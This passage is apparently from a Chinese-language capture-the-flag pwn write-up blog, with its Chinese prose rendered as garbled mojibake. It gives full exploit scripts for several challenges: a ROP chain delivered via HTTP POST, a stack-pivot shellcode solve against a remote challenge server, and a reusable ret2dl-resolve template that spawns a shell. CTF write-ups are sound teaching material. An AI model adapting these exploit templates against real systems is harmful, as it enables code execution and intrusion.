ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000497310</span>) <span class="hljs-comment"># add rax, 1 ; ret</span><br>p += pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-number">0x0000000000402734</span>) <span class="hljs-comment"># syscall</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;</span> , <span class="hljs-built_in">len</span>(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p))<br>payload2=<span class="hljs-string">b&#x27;&#x27;&#x27;POST /add HTTP/1.1\r</span><br><span class="hljs-string">Host: www.baidu.com\r</span><br><span class="hljs-string">User-Agent: Haha\r</span><br><span class="hljs-string">Content-Length: 1192\r</span><br><span class="hljs-string">Content: &#x27;&#x27;&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(canary)+p64(<span class="hljs-number">0</span>)+p+<span class="hljs-string">b&#x27;\r\n&#x27;</span><br>io.send(payload2)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="babyshellcode"><a href="#babyshellcode" class="headerlink" title="babyshellcode"></a>babyshellcode</h2><p>åˆ©ç”¨ç¬¬ä¸€æ¬¡shellcode<strong>æ ˆè¿ç§»</strong>ï¼Œå†é€šè¿‡ropé“¾è°ƒç”¨syscallæ‰§è¡Œreadï¼Œæœ€åé‡æ–°æ‰§è¡Œshellcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>shellcode = <span class="hljs-string">&quot;&quot;&quot;mov esp, esi</span><br><span class="hljs-string">ret</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>shellcode = asm(shellcode)<br>sh = asm(shellcraft.sh())<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(shellcode))<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b *(*shellcode+128)</span><br><span class="hljs-comment">#                b *(*shellcode+143)</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br><br>pop_rdi_rsi = p64(<span class="hljs-number">0x4013c9</span>)<br>syscall = p64(<span class="hljs-number">0x401332</span>)<br>mv_ecx_edx = p64(<span class="hljs-number">0x4012b1</span>)<br><br><br><br>io = remote(<span class="hljs-string">&quot;59.110.162.87&quot;</span>, <span class="hljs-number">28725</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;gift: &quot;</span>)<br>buf = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;.&quot;</span>)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;buf: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(buf)&#125;</span>&quot;</span>)<br>rop_chain =  pop_rdi_rsi + p64(<span class="hljs-number">0</span>) + p64(buf) + mv_ecx_edx + syscall + p64(buf)<br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, rop_chain)<br>io.sendafter(<span class="hljs-string">b&quot;&gt; &quot;</span>, shellcode)<br>pause()<br>io.send(sh)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="riya"><a href="#riya" class="headerlink" title="riya"></a>riya</h2><p>è¾“å…¥nç›´æ¥ç»™shellâ€¦â€¦ä¸æ˜¯ï¼Œå“¥ä»¬ï¼Ÿ</p><h2 id="toys"><a href="#toys" class="headerlink" title="toys"></a>toys</h2><p>å®˜æ–¹é¢˜è§£éœ€è¦å¤šæ¬¡æ ˆè¿ç§»ï¼Œéå¸¸éº»çƒ¦ï¼Œä»¤äººå¤´å¤§ã€‚ä½†è¿™é¢˜æœ‰ä¸ªéé¢„æœŸè§£:<code>ret2dl</code>ï¼Œå¥—æ¿å­å³å¯ã€‚å‚è€ƒ<a href="http://39.104.51.85/index.php/2025/01/26/%e6%98%a5%e7%a7%8b%e6%9d%af%e5%86%ac%e5%ad%a3%e8%b5%9bday3-toys%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3/">æ˜¥ç§‹æ¯å†¬å­£èµ›day3 pwn toyséé¢„æœŸè§£ â€“ åšçš„blog</a><br>æ¿å­æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-comment"># ret2dlæ¿å­</span><br><span class="hljs-comment"># ä¼ å‚åˆ†åˆ«ä¸ºï¼šä¼ªé€ çš„link_mapåœ°å€ã€åœ¨gotè¡¨ä¸­å­˜åœ¨å‡½æ•°åœ°å€çš„gotåœ°å€ã€libcä¸­systemçš„åœ°å€ã€ç¬¬äºŒä¸ªå‚æ•°å¯¹åº”çš„å‡½æ•°åœ¨libcä¸­çš„åç§»</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ret2dl_data</span>(<span class="hljs-params">fake_link_map_addr, got_solved_addr, system_base, solved_base</span>):<br>    offset = system_base - solved_base<br> <br>    fake_Elf64_Dyn = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Dyn += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># d_tag  ä»link_mapä¸­æ‰¾.rel.pltä¸éœ€è¦ç”¨åˆ°æ ‡ç­¾ï¼Œ éšæ„è®¾ç½®</span><br>    fake_Elf64_Dyn += p64(fake_link_map_addr + <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># d_ptr  æŒ‡å‘ä¼ªé€ çš„Elf64_Relaç»“æ„ä½“ï¼Œç”±äºreloc_offsetä¹Ÿè¢«æ§åˆ¶ä¸º0ï¼Œä¸éœ€è¦ä¼ªé€ å¤šä¸ªç»“æ„ä½“</span><br> <br>    fake_Elf64_Rela = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Rela += p64(<br>        fake_link_map_addr - offset)  <span class="hljs-comment"># r_offset rel_addr = l-&gt;addr+reloc_offsetï¼Œ</span><br>    <span class="hljs-comment"># ç›´æ¥æŒ‡å‘fake_link_mapæ‰€åœ¨ä½ç½®ä»¤å…¶å¯è¯»å†™å°±è¡Œï¼Œoffsetä¸ºæŒ‡å‘çš„éœ€è¦çš„å‡½æ•°è·ç¦»å¯å¾—çœŸå®åœ°å€çš„å‡½æ•°çš„åç§»</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">7</span>)  <span class="hljs-comment"># r_info indexè®¾ç½®ä¸º0ï¼Œæœ€åä¸€å­—èŠ‚å¿…é¡»ä¸º7</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># r_addend  éšæ„è®¾ç½®</span><br> <br>    fake_Elf64_Sym = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Sym += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_name éšæ„è®¾ç½®</span><br>    fake_Elf64_Sym += <span class="hljs-string">b&#x27;AAAA&#x27;</span>  <span class="hljs-comment"># st_info, st_other, st_shndx st_otheré0ä»¥é¿å…è¿›å…¥é‡å®šä½ç¬¦å·çš„åˆ†æ”¯</span><br>    fake_Elf64_Sym += p64(got_solved_addr - <span class="hljs-number">8</span>)  <span class="hljs-comment"># st_value å·²è§£æå‡½æ•°çš„gotè¡¨åœ°å€-8ï¼Œ-8ä½“ç°åœ¨æ±‡ç¼–ä»£ç ä¸­ï¼ŒåŸå› ä¸æ˜</span><br>    fake_Elf64_Sym += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_size éšæ„è®¾ç½®</span><br> <br>    fake_link_map_data = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-comment"># å¦‚æœoffsetä¸ºè´Ÿæ•°ä½¿ç”¨è¡¥ç </span><br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        fake_link_map_data += p64(<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> + offset)  <span class="hljs-comment"># l_addrï¼Œä¼ªé€ ä¸ºä¸¤ä¸ªå‡½æ•°çš„åœ°å€åç§»å€¼çš„è¡¥ç ï¼ˆä¸ºè´Ÿæ—¶ï¼‰</span><br>    <span class="hljs-keyword">else</span>:<br>        fake_link_map_data += p64(offset)  <span class="hljs-comment"># l_addrï¼Œä¼ªé€ ä¸ºä¸¤ä¸ªå‡½æ•°çš„åœ°å€åç§»å€¼</span><br> <br>    fake_link_map_data += fake_Elf64_Dyn<br>    fake_link_map_data += fake_Elf64_Rela<br>    fake_link_map_data += fake_Elf64_Sym<br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x20</span><br>    fake_link_map_data += p64(fake_link_map_addr)  <span class="hljs-comment"># DT_STRTAB è®¾ç½®ä¸ºä¸€ä¸ªå¯è¯»çš„åœ°å€</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># DT_SYMTAB æŒ‡å‘å¯¹åº”ç»“æ„ä½“æ•°ç»„çš„åœ°å€</span><br>    fake_link_map_data += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x78</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x8</span>)  <span class="hljs-comment"># DT_JMPREL æŒ‡å‘å¯¹åº”æ•°ç»„ç»“æ„ä½“çš„åœ°å€</span><br> <br>    <span class="hljs-keyword">return</span> fake_link_map_data<br>ret2dldata=get_ret2dl_data(fake_link_map_addr,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>],onegadget[<span class="hljs-number">3</span>],libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*?+p64(rbp)+p64(jmp_dl)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)+ret2dldata<br></code></pre></td></tr></table></figure><p>è¿™æ˜¯é¢˜è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>] <br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># p = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#               b *(0x401251)</span><br><span class="hljs-comment">#               &quot;&quot;&quot;)</span><br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment"># ä¼ å‚åˆ†åˆ«ä¸ºï¼šä¼ªé€ çš„link_mapåœ°å€ã€åœ¨gotè¡¨ä¸­å­˜åœ¨å‡½æ•°åœ°å€çš„gotåœ°å€ã€libcä¸­systemçš„åœ°å€ã€ç¬¬äºŒä¸ªå‚æ•°å¯¹åº”çš„å‡½æ•°åœ¨libcä¸­çš„åœ°å€</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_ret2dl_data</span>(<span class="hljs-params">fake_link_map_addr, got_solved_addr, system_base, solved_base</span>):<br>    offset = system_base - solved_base<br> <br>    fake_Elf64_Dyn = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Dyn += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># d_tag  ä»link_mapä¸­æ‰¾.rel.pltä¸éœ€è¦ç”¨åˆ°æ ‡ç­¾ï¼Œ éšæ„è®¾ç½®</span><br>    fake_Elf64_Dyn += p64(fake_link_map_addr + <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># d_ptr  æŒ‡å‘ä¼ªé€ çš„Elf64_Relaç»“æ„ä½“ï¼Œç”±äºreloc_offsetä¹Ÿè¢«æ§åˆ¶ä¸º0ï¼Œä¸éœ€è¦ä¼ªé€ å¤šä¸ªç»“æ„ä½“</span><br> <br>    fake_Elf64_Rela = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Rela += p64(fake_link_map_addr - offset)  <span class="hljs-comment"># r_offset rel_addr = l-&gt;addr+reloc_offsetï¼Œ</span><br>    <span class="hljs-comment"># ç›´æ¥æŒ‡å‘fake_link_mapæ‰€åœ¨ä½ç½®ä»¤å…¶å¯è¯»å†™å°±è¡Œï¼Œoffsetä¸ºæŒ‡å‘çš„éœ€è¦çš„å‡½æ•°è·ç¦»å¯å¾—çœŸå®åœ°å€çš„å‡½æ•°çš„åç§»</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">7</span>)  <span class="hljs-comment"># r_info indexè®¾ç½®ä¸º0ï¼Œæœ€åä¸€å­—èŠ‚å¿…é¡»ä¸º7</span><br>    fake_Elf64_Rela += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># r_addend  éšæ„è®¾ç½®</span><br> <br>    fake_Elf64_Sym = <span class="hljs-string">b&quot;&quot;</span><br>    fake_Elf64_Sym += p32(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_name éšæ„è®¾ç½®</span><br>    fake_Elf64_Sym += <span class="hljs-string">b&#x27;AAAA&#x27;</span>  <span class="hljs-comment"># st_info, st_other, st_shndx st_otheré0ä»¥é¿å…è¿›å…¥é‡å®šä½ç¬¦å·çš„åˆ†æ”¯</span><br>    fake_Elf64_Sym += p64(got_solved_addr - <span class="hljs-number">8</span>)  <span class="hljs-comment"># st_value å·²è§£æå‡½æ•°çš„gotè¡¨åœ°å€-8ï¼Œ-8ä½“ç°åœ¨æ±‡ç¼–ä»£ç ä¸­ï¼ŒåŸå› ä¸æ˜</span><br>    fake_Elf64_Sym += p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># st_size éšæ„è®¾ç½®</span><br> <br>    fake_link_map_data = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-comment"># å¦‚æœoffsetä¸ºè´Ÿæ•°ä½¿ç”¨è¡¥ç </span><br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        fake_link_map_data += p64(<span class="hljs-number">2</span> ** <span class="hljs-number">64</span> + offset)  <span class="hljs-comment"># l_addrï¼Œä¼ªé€ ä¸ºä¸¤ä¸ªå‡½æ•°çš„åœ°å€åç§»å€¼çš„è¡¥ç ï¼ˆä¸ºè´Ÿæ—¶ï¼‰</span><br>    <span class="hljs-keyword">else</span>:<br>        fake_link_map_data += p64(offset)  <span class="hljs-comment"># l_addrï¼Œä¼ªé€ ä¸ºä¸¤ä¸ªå‡½æ•°çš„åœ°å€åç§»å€¼</span><br> <br>    fake_link_map_data += fake_Elf64_Dyn<br>    fake_link_map_data += fake_Elf64_Rela<br>    fake_link_map_data += fake_Elf64_Sym<br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x20</span><br>    fake_link_map_data += p64(fake_link_map_addr)  <span class="hljs-comment"># DT_STRTAB è®¾ç½®ä¸ºä¸€ä¸ªå¯è¯»çš„åœ°å€</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x30</span>)  <span class="hljs-comment"># DT_SYMTAB æŒ‡å‘å¯¹åº”ç»“æ„ä½“æ•°ç»„çš„åœ°å€</span><br>    fake_link_map_data += <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>    fake_link_map_data += <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x78</span><br>    fake_link_map_data += p64(fake_link_map_addr + <span class="hljs-number">0x8</span>)  <span class="hljs-comment"># DT_JMPREL æŒ‡å‘å¯¹åº”æ•°ç»„ç»“æ„ä½“çš„åœ°å€</span><br> <br>    <span class="hljs-keyword">return</span> fake_link_map_data<br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x404500</span>+<span class="hljs-number">0x80</span>)+p64(<span class="hljs-number">0x0000000000401251</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,payload1)<br>fake_link_map_addr=<span class="hljs-number">0x4045a0</span><br>jmp_dl=<span class="hljs-number">0x401026</span><br>leave_ret=<span class="hljs-number">0x00000000004012cd</span><br>onegadget=[<span class="hljs-number">0x583dc</span>,<span class="hljs-number">0x583e3</span>,<span class="hljs-number">0xef4ce</span>,<span class="hljs-number">0xef52b</span>]<br>ret2dldata=get_ret2dl_data(fake_link_map_addr,elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>],onegadget[<span class="hljs-number">3</span>],libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>payload2=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x404500</span>)+p64(jmp_dl)+p64(fake_link_map_addr)+p64(<span class="hljs-number">0</span>)+ret2dldata<br><span class="hljs-comment"># p.debug()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;Data: &#x27;</span>,payload2)<br> <br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="rogue-like"><a href="#rogue-like" class="headerlink" title="rogue_like"></a>rogue_like</h2><p><strong>æœ¬é¢˜å¿…é¡»æ­å»ºè¿œç¨‹ç¯å¢ƒæ‰èƒ½å¤ç°(åŸå› è§ä¸‹æ–‡)ï¼Œå¯ä»¥ç®€å•åœ°patchelfåç”¨socatè½¬å‘ç«¯å£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨docker(ç¯å¢ƒ:Ubuntu 18.04)</strong><br>è¿™é¢˜å¤§ä½“æ€è·¯æ˜¯åˆ©ç”¨ä¸‰æ¬¡è‚‰é¸½ï¼Œæ­¥éª¤ä¸ºæŠŠtlsä¸Šçš„canaryç½®0-&gt;alarm gotè¡¨+5(å€Ÿæ­¤è·å–syscallçš„gadget)-&gt;off by nullè¿›è¡Œæ ˆè¿ç§»+ROPã€‚çœ‹è¿‡å®˜æ–¹wpååº”è¯¥ä¸éš¾ç†è§£è¿™ä¸ªå¤§ä½“æ€è·¯ã€‚æ­¤é¢˜éš¾ç‚¹ä¸»è¦æ˜¯è¿™äº›ï¼š</p><ol><li>tlsæ®µä¸Šçš„canaryçš„åœ°å€éš¾ä»¥è·å¾—ã€‚è¿™é‡Œå¯ä»¥åœ¨è°ƒè¯•æ—¶ä½¿ç”¨<code>tls</code>æŒ‡ä»¤æŸ¥çœ‹ï¼Œä¾æ¬¡æŠŠtlsæ®µä¸Šçš„æ‰€æœ‰æ•°æ®éƒ½è¯»ä¸€éï¼Œå’Œ<code>canary</code>å€¼ä¸€è‡´çš„å°±æ˜¯canaryçš„åœ°å€ã€‚</li><li>æ ˆè¿ç§»éšæœºæ€§å¤ªé«˜ã€‚è¿™é‡Œå¯ä»¥å°†ROPé“¾å‰é¢å¡«æ»¡<code>ret</code>ï¼Œè¿™æ ·æˆåŠŸç‡å°±ä¼šå¤§å¤§å¢åŠ 